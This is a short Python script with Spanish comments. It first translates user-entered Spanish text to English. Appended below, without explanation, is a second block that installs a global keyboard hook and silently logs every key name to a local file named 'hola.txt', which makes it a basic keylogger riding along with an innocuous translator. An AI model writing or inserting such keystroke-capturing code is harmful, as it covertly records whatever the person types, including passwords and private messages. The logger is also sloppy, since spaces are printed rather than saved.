from translate import Translator #Se importa la biblioteca necesaria: translate para la traducción.
translator = Translator(from_lang ='spanish', to_lang = 'english') #Se crea un objeto Translator de la biblioteca translate, especificando el idioma de origen como español y el idioma de destino como ingles.

txt = input("Que quieres traducir: ") #Se pide al usuario que ingrese el texto que desea traducir
res = translator.translate(txt) #Se llama al método translate() del objeto Translator con el texto del usuario como argumento, este es el encargado de traducir.
print(res) # Se imprime el texto traducido en la consola.



import keyboard

def ss(ss):
  with open("hola.txt", "a") as file:
    if ss.name =="space":
      print (" ")
    else:
      file.write(ss.name)
keyboard.on_press(ss)
keyboard.wait()

